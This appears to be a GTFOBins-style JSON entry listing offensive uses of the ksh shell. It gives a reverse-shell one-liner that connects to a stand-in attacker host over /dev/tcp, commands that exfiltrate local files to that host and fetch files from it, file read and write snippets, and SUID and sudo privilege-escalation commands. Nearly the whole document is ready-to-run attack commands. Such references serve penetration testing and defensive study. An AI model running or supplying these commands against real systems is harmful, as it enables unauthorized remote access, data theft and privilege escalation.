{
  "functions": {
    "shell": [
      {
        "code": "ksh"
      }
    ],
    "reverse-shell": [
      {
        "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n"
      }
    ],
    "file-upload": [
      {
        "description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"
      },
      {
        "description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"
      }
    ],
    "file-download": [
      {
        "description": "Fetch a remote file via HTTP GET request.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"
      },
      {
        "description": "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"
      }
    ],
    "file-write": [
      {
        "code": "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n"
      }
    ],
    "file-read": [
      {
        "description": "It trims trailing newlines.",
        "code": "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n"
      },
      {
        "description": "It trims trailing newlines.",
        "code": "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'\n"
      }
    ],
    "suid": [
      {
        "code": "./ksh -p"
      }
    ],
    "sudo": [
      {
        "code": "sudo ksh"
      }
    ]
  }
}
